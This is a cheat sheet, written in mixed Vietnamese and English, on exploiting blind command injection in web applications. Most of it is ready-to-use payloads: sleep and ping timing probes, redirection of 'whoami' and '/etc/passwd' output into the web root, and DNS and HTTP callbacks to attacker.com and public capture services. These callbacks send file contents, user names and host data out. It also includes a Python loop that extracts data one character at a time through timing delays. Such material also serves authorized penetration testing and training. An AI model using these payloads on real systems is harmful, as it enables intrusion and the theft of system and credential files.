# Blind Command Injection

## Definition

Blind Command Injection xảy ra khi ứng dụng vulnerable với command injection nhưng **không trả về output** của injected command trong HTTP response. Attacker cần sử dụng các kỹ thuật gián tiếp để confirm vulnerability và exfiltrate data.

## Detection Techniques

### Time-based Detection

Sử dụng commands gây delay để confirm execution:

#### Linux Time Delays

```bash
# Sleep command
; sleep 5
| sleep 5
|| sleep 5
&& sleep 5
`sleep 5`
$(sleep 5)

# Ping loopback (network delay)
; ping -c 5 127.0.0.1
| ping -c 10 127.0.0.1

# Combining với newline
%0a sleep 5
```

#### Windows Time Delays

```cmd
# Ping loopback (mỗi ping ~1 giây)
& ping -n 5 127.0.0.1
| ping -n 10 127.0.0.1
|| ping -n 5 127.0.0.1

# Timeout command
& timeout 5

# PowerShell
& powershell Start-Sleep -Seconds 5
```

#### Detection Logic

```
Payload: ; sleep 5
Expected: Response time tăng ~5 giây

Payload: ; sleep 10
Expected: Response time tăng ~10 giây

Nếu delay tỉ lệ thuận với sleep value → CONFIRMED VULNERABLE
```

## Output Redirection to Web Root

Nếu biết web root path, redirect output ra file accessible qua browser:

### Technique

```bash
# Write to web root
; whoami > /var/www/html/output.txt
; cat /etc/passwd > /var/www/html/data.txt
; id > /var/www/html/id.txt

# Cho URL-based app
%0a whoami > /var/www/html/output.txt
```

### Verify

```
Browser: https://target.com/output.txt
→ Nếu có nội dung → command executed
```

### Common Web Root Paths

| Server | Common Paths |
|--------|--------------|
| Apache | `/var/www/html/`, `/var/www/`, `/srv/www/` |
| Nginx | `/usr/share/nginx/html/`, `/var/www/html/` |
| IIS | `C:\inetpub\wwwroot\` |
| Tomcat | `/var/lib/tomcat/webapps/ROOT/` |

### Alternative Writable Locations

```bash
# Temp directories
; whoami > /tmp/out.txt
; cat /tmp/out.txt

# Web-accessible upload directories
; whoami > /var/www/html/uploads/out.txt
; whoami > /var/www/html/images/out.txt
```

## Out-of-Band (OOB) Techniques

Khi không có web-accessible location, sử dụng external channels.

### DNS Exfiltration

Attacker setup DNS server để capture lookups:

```bash
# Basic DNS lookup
; nslookup attacker.com
; host attacker.com
; dig attacker.com

# Với data trong subdomain
; nslookup $(whoami).attacker.com
; host $(id).attacker.com

# Loop để exfiltrate từng item
; for i in $(ls /); do host "$i.attacker.com"; done
; for i in $(ls /); do nslookup "$i.xxxx.d.zhack.ca"; done
```

### HTTP Callback

Attacker setup HTTP server để capture requests:

```bash
# Wget
; wget http://attacker.com/
; wget http://attacker.com/$(whoami)
; wget http://attacker.com/?data=$(cat /etc/passwd | base64)

# Curl
; curl http://attacker.com/
; curl http://attacker.com/$(whoami)
; curl http://attacker.com/?data=$(id | base64)

# Curl POST
; curl -X POST -d "$(cat /etc/passwd)" http://attacker.com/
```

### Combined DNS + Data

```bash
# Encode data vào subdomain
; host "$(whoami).attacker.com"
; nslookup "$(hostname).attacker.com"

# Multi-line data (mỗi line một request)
; cat /etc/passwd | while read line; do host "$(echo $line | base64).attacker.com"; done
```

## Time-based Data Exfiltration

Khi không có OOB channel, extract data character-by-character bằng time delay:

### Concept

```
Nếu ký tự đầu của output là 's' → sleep 5
Nếu không phải → không delay

Loop qua tất cả ký tự để reconstruct data
```

### Implementation

```bash
# Check first character = 's'
; if [ $(whoami | cut -c 1) == s ]; then sleep 5; fi

# Check first character = 'w'
; if [ $(whoami | cut -c 1) == w ]; then sleep 5; fi

# Check second character
; if [ $(whoami | cut -c 2) == w ]; then sleep 5; fi

# Check third character
; if [ $(whoami | cut -c 3) == w ]; then sleep 5; fi
```

### Automation Logic

```python
# Pseudocode for automation
import time
import requests

charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
result = ''

for position in range(1, 20):
    for char in charset:
        payload = f"; if [ $(whoami|cut -c {position}) == {char} ]; then sleep 3; fi"
        start = time.time()
        requests.get(url, params={'input': payload})
        elapsed = time.time() - start
        
        if elapsed >= 3:
            result += char
            print(f"Found: {result}")
            break
```

### Practical Example

```bash
# Extracting 'www-data' character by character
$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m0.002s    # No match

$ time if [ $(whoami|cut -c 1) == w ]; then sleep 5; fi
real    0m5.007s    # MATCH! First char = 'w'

$ time if [ $(whoami|cut -c 2) == w ]; then sleep 5; fi
real    0m5.003s    # MATCH! Second char = 'w'

$ time if [ $(whoami|cut -c 3) == w ]; then sleep 5; fi
real    0m5.001s    # MATCH! Third char = 'w'

$ time if [ $(whoami|cut -c 4) == - ]; then sleep 5; fi
real    0m5.002s    # MATCH! Fourth char = '-'
```

## Online OOB Testing Tools

### DNS-based Services

| Service | URL | Usage |
|---------|-----|-------|
| dnsbin | http://dnsbin.zhack.ca | Get unique subdomain, monitor lookups |
| Interactsh | https://app.interactsh.com | DNS, HTTP, SMTP capture |
| pingb.in | http://pingb.in | Simple DNS callback |
| Burp Collaborator | Built into Burp Suite Pro | DNS, HTTP, SMTP |

### HTTP-based Services

```bash
# Interactsh example
; curl http://abc123.interactsh.com/$(whoami)

# Webhook.site
; curl http://webhook.site/unique-id?data=$(id)

# RequestBin
; curl http://requestbin.com/unique-id?data=$(hostname)
```

### Using dnsbin

```bash
# Step 1: Go to http://dnsbin.zhack.ca/
# Step 2: Get unique subdomain (e.g., abc123.d.zhack.ca)
# Step 3: Inject payload

; for i in $(ls /); do host "$i.abc123.d.zhack.ca"; done

# Step 4: Monitor dnsbin dashboard for captured subdomains
```

## Blind Injection Workflow

```
┌─────────────────────────────────────────────────────────────────┐
│                 BLIND INJECTION WORKFLOW                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  1. CONFIRM      ──► Time-based: ; sleep 5                       │
│        │              Response delayed? → Vulnerable             │
│        ▼                                                          │
│  2. TRY OUTPUT   ──► Redirect: ; whoami > /var/www/html/out.txt │
│     REDIRECT          Check: curl http://target.com/out.txt     │
│        │                                                          │
│        ▼ (Failed)                                                 │
│  3. TRY OOB      ──► DNS: ; nslookup $(whoami).attacker.com     │
│                       HTTP: ; curl http://attacker.com/$(id)     │
│        │                                                          │
│        ▼ (No OOB)                                                 │
│  4. TIME-BASED   ──► Extract char-by-char với conditional sleep  │
│     EXFIL             ; if [ $(whoami|cut -c 1) == a ]; sleep 3  │
│                                                                   │
└─────────────────────────────────────────────────────────────────┘
```

## Advanced OOB Payloads

### Exfiltrate File Content via DNS

```bash
# Encode file content và gửi qua DNS
; cat /etc/passwd | base64 | head -c 60 | xargs -I{} host {}.attacker.com

# Chunk và gửi từng phần
; cat /etc/passwd | base64 | fold -w30 | while read line; do host "$line.attacker.com"; done
```

### Exfiltrate via HTTP POST

```bash
# POST entire file
; curl -X POST -d @/etc/passwd http://attacker.com/

# Base64 encoded
; curl http://attacker.com/$(cat /etc/passwd | base64 | tr -d '\n')
```

### Background Execution for Long Operations

```bash
# Nohup để prevent timeout kill
; nohup curl http://attacker.com/$(cat /etc/passwd | base64) &

# Subshell background
; (sleep 10; curl http://attacker.com/done) &
```
